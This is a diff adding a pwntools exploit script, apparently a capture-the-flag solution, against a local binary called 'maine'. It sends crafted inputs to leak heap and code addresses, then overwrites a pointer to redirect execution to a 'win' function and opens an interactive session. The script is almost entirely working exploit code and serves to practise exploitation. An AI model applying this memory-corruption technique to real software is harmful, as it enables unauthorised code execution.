@@ -1,0 +1,57 @@
+#!/bin/python3
+from pwn import *
+context.terminal = ['foot']
+context.arch = 'amd64'
+elf = context.binary = ELF("./maine")
+
+p = process([elf.path])
+def GDB():
+    gdb.attach(p,gdbscript="""
+
+
+               """)
+GDB()
+p.sendline(b'log')
+p.sendline(b'$a=abc')
+# gdb.attach(p)
+#input("PAUSA")
+p.sendline(b'X' * 20)
+p.sendline(b'X' * 10 + b'|')
+p.sendline(b'$(($a+$a))')
+
+p.recvuntil(b'|')
+p.recvuntil(b'> ')
+
+leak = (int(p.recvline().strip()) // 2) - (0x555555571730 - 0x55555555e000)
+print("[i] Leak:", hex(leak))
+
+p.sendline(b'log')
+p.sendline(b'$b=AAAAAA')
+
+text_leak = leak + (0x555555571758 - 0x55555555e000)
+p.sendline(b'X' * 16)
+p.sendline(b'X' * 16)
+p.sendline(b'X' * 7 + p64(text_leak))
+
+p.sendline(b'$(($b+$b))')
+
+p.recvuntil(b'Invalid variable b: ')
+elf.address = u64(p.recv(6).ljust(8, b'\x00')) - (0x55555555d288 - 0x555555554000)
+print("[i] .text:", hex(elf.address))
+
+win = elf.address + (0x555555556dad - 0x555555554000)
+jmp = leak + (0x555555571880 - 0x55555555e000)
+
+p.sendline(b'log')
+p.sendline(b'$c=' + str(win).encode())
+p.sendline(b'log')
+p.sendline(b'$d=6789')
+
+p.sendline(b'X' * 16)
+p.sendline(b'X' * 7 + p64(jmp))
+
+p.sendline(b'$d')
+
+######################################################################################
+
+p.interactive()
